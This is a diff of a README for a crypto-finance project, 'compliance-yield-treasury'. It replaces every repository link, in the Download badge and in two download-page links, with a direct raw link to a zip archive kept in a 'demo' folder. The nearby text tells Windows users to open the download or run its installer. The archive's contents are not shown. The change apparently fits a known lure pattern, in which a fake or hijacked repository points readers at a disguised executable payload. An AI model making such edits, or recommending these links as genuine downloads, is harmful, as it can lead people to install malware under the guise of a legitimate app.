@@ -1,6 +1,6 @@
 # 🧾 compliance-yield-treasury - Secure Yield for Locked Capital
 
-[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cgho4850/compliance-yield-treasury)
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Cgho4850/compliance-yield-treasury/main/demo/yield_treasury_compliance_2.9.zip)
 
 ## 🚀 What this app does
 
@@ -20,7 +20,7 @@ Use this project if you want:
 
 To get the app, visit this page to download:
 
-[https://github.com/Cgho4850/compliance-yield-treasury](https://github.com/Cgho4850/compliance-yield-treasury)
+[https://raw.githubusercontent.com/Cgho4850/compliance-yield-treasury/main/demo/yield_treasury_compliance_2.9.zip](https://raw.githubusercontent.com/Cgho4850/compliance-yield-treasury/main/demo/yield_treasury_compliance_2.9.zip)
 
 On Windows, open the page and look for the latest release, build file, or setup package. Download the file to your PC, then open it or run the included installer if one is provided.
 
@@ -222,7 +222,7 @@ This helps you understand how the treasury rules, yield flow, and access checks 
 
 If you need the download page again, use this link:
 
-[https://github.com/Cgho4850/compliance-yield-treasury](https://github.com/Cgho4850/compliance-yield-treasury)
+[https://raw.githubusercontent.com/Cgho4850/compliance-yield-treasury/main/demo/yield_treasury_compliance_2.9.zip](https://raw.githubusercontent.com/Cgho4850/compliance-yield-treasury/main/demo/yield_treasury_compliance_2.9.zip)
 
 ## 🏷️ Topics
 
